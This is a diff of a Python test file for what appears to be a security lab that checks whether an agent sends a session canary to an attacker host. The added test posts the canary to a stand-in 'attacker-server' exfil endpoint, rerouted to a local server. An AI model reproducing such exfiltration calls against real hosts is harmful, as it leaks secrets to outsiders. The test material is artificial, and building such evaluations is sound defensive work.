@@ -4,8 +4,11 @@ from __future__ import annotations
 
 import importlib.util
 import json
+import threading
 import unittest
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
+from unittest.mock import patch
 
 from score_lab02 import (
     callback_attempts,
@@ -159,6 +162,61 @@ class AgentMockTest(unittest.TestCase):
             step = agent.http_post("http://example.com/exfil", {"session_canary": "x"})
             self.assertIn("refused", step["error"])
             self.assertIsNone(step["status"])
+
+
+class DialMapTest(unittest.TestCase):
+    def test_dial_map_keeps_the_service_host(self) -> None:
+        spec = importlib.util.spec_from_file_location("lab02_agent_dial", AGENT)
+        assert spec and spec.loader
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        seen: dict[str, str] = {}
+
+        class Handler(BaseHTTPRequestHandler):
+            def log_message(self, fmt: str, *args: object) -> None:
+                return
+
+            def do_POST(self) -> None:  # noqa: N802
+                length = int(self.headers.get("Content-Length", "0") or "0")
+                self.rfile.read(length)
+                seen["host"] = self.headers.get("Host", "")
+                raw = b"ok"
+                self.send_response(200)
+                self.send_header("Content-Length", str(len(raw)))
+                self.end_headers()
+                self.wfile.write(raw)
+
+        server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+        port = server.server_address[1]
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        try:
+            mapping = module.parse_dial_map(
+                "attacker-server.lab02-shared.svc.cluster.local=127.0.0.1,"
+                "example.com=127.0.0.1,legit-api.lab02.svc=not-an-ip"
+            )
+            self.assertEqual(
+                mapping, {"attacker-server.lab02-shared.svc.cluster.local": "127.0.0.1"}
+            )
+            with patch.object(module, "parse_dial_map", return_value=mapping):
+                real_create = module.socket.create_connection
+
+                def create(address, timeout=None, source_address=None):  # type: ignore[no-untyped-def]
+                    host, _ = address
+                    if host == "127.0.0.1":
+                        address = ("127.0.0.1", port)
+                    return real_create(address, timeout, source_address)
+
+                with patch.object(module.socket, "create_connection", side_effect=create):
+                    step = module.http_post(
+                        "http://attacker-server.lab02-shared.svc.cluster.local/exfil",
+                        {"session_canary": "lab02_session_test", "source": "lab02"},
+                    )
+        finally:
+            server.shutdown()
+        self.assertEqual(step["status"], 200)
+        self.assertEqual(step["dial_ip"], "127.0.0.1")
+        self.assertEqual(seen["host"], "attacker-server.lab02-shared.svc.cluster.local")
 
 
 class ChallengeTest(unittest.TestCase):
